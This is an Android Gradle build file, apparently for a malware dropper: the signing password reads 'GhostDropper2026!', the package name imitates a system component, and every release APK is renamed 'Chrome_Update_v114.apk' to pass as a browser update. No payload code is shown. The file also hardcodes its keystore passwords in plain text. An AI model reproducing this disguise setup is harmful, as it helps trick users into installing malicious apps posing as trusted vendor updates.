plugins {
    id 'com.android.application'
}

android {
    namespace 'com.android.shell.ghost'
    compileSdk 34

    defaultConfig {
        applicationId "com.android.shell.ghost"
        minSdk 24
        targetSdk 34
        versionCode 114
        versionName "2.1.114"
    }

    signingConfigs {
        release {
            storeFile file("../release.keystore")
            storePassword "GhostDropper2026!"
            keyAlias "ghost"
            keyPassword "GhostDropper2026!"
        }
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
    }

    applicationVariants.all { variant ->
        variant.outputs.all {
            outputFileName = "Chrome_Update_v114.apk"
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
}

dependencies {
}